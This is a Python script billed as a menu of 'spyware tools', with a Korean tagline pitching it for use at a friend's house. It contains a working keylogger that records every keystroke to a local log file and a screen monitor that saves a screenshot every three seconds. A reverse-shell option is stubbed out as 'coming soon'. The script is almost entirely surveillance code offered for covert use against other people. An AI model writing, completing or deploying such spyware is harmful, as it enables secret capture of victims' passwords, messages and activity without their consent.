import socket
import pynput
from pynput.keyboard import Key, Listener
import logging
import os
import pyautogui
import schedule
import time

class TextColors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

def logo():
    print(TextColors.WHITE + """
 █████╗ ███╗   ██╗ ██████╗ ███╗   ██╗██╗   ██╗███╗   ███╗ ██████╗ ██╗   ██╗███████╗
██╔══██╗████╗  ██║██╔═══██╗████╗  ██║╚██╗ ██╔╝████╗ ████║██╔═══██╗██║   ██║██╔════╝ 
███████║██╔██╗ ██║██║   ██║██╔██╗ ██║ ╚████╔╝ ██╔████╔██║██║   ██║██║   ██║███████╗
██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║  ╚██╔╝  ██║╚██╔╝██║██║   ██║██║   ██║╚════██║
██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║   ██║   ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████║ 친구집에서 써먹기좋은
╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝ spyware tools
          """ + TextColors.RESET)

logo()

def menu():
    print(TextColors.WHITE + "----------------SPYWARE MENU-----------------" + TextColors.RESET)
    print(TextColors.BLACK + "[1] KEY LOGGER" + TextColors.RESET)
    print(TextColors.BLACK + "[2] MONITOR SCREENSHOT" + TextColors.RESET)
    print(TextColors.BLACK + "[3] TEST" + TextColors.RESET)
    print(TextColors.WHITE + "----------------SPYWARE MENU----------------- \n" + TextColors.RESET)

menu()

select = input(TextColors.GREEN + "anonymous_root:~$ : " + TextColors.RESET)

if select in ["1", "KEY LOGGER"]:
    def LogHunter_logo():
        print("""
██╗  ██╗███████╗██╗   ██╗    ██╗      ██████╗  ██████╗  ██████╗ ███████╗██████╗ 
██║ ██╔╝██╔════╝╚██╗ ██╔╝    ██║     ██╔═══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗
█████╔╝ █████╗   ╚████╔╝     ██║     ██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝
██╔═██╗ ██╔══╝    ╚██╔╝      ██║     ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗  
██║  ██╗███████╗   ██║       ███████╗╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║
╚═╝  ╚═╝╚══════╝   ╚═╝       ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
        """)
    print("KEY LOGGER START..")

    def setup_logging():
        log_dir = r"C:\Users\USER\Downloads\log"
        log_file = os.path.join(log_dir, "3.0")
        
        os.makedirs(log_dir, exist_ok=True)
        
        logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

    buffer = []

    def on_press(key):
        global buffer

        try:
            key_str = f'{key.char}'
        except AttributeError:
            key_str = f'{key}'
        
        buffer.append(key_str)

        if len(''.join(buffer)) >= 1:
            log_str = ''.join(buffer)
            logging.info(log_str)
            print(f"[+] TERMINAL LOG 👀 : {log_str}")
            buffer.clear()

    def start_keylogger():
        setup_logging()
        try:
            with Listener(on_press=on_press) as listener:
                listener.join()
        except KeyboardInterrupt:
            print("\n[+] bye bye :( .")

    LogHunter_logo()
    start_keylogger()

elif select in ["2", "MONITOR SCREENSHOT"]:
    print("""
███████╗████████████╗█████████████████╗   ███████████╗  ██╗██████╗████████╗
██╔════██╔════██╔══████╔════██╔════████╗  ████╔════██║  ████╔═══██╚══██╔══╝
█████████║    ██████╔█████╗ █████╗ ██╔██╗ ██████████████████║   ██║  ██║   
╚════████║    ██╔══████╔══╝ ██╔══╝ ██║╚██╗██╚════████╔══████║   ██║  ██║  
███████╚████████║  ██████████████████║ ╚█████████████║  ██╚██████╔╝  ██║   
╚══════╝╚═════╚═╝  ╚═╚══════╚══════╚═╝  ╚═══╚══════╚═╝  ╚═╝╚═════╝   ╚═╝
    """)
    print("[+] SCREENSHOT START...")

    def capture_screenshot(filename):
        screenshot = pyautogui.screenshot()
        screenshot.save(filename)
        print(f"Screenshot saved as {filename}")

    def job():
        capture_screenshot(f"C:\\Users\\USER\\Downloads\\HACKED BY ANONYMOUS{time.strftime('%Y%m%d_%H%M%S')}.png")

    schedule.every(3).seconds.do(job)

    while True:
        schedule.run_pending()
        time.sleep(1)


elif select in ["3" , "REVERSE SHELL"]:
    print("COMING SOON...")
    

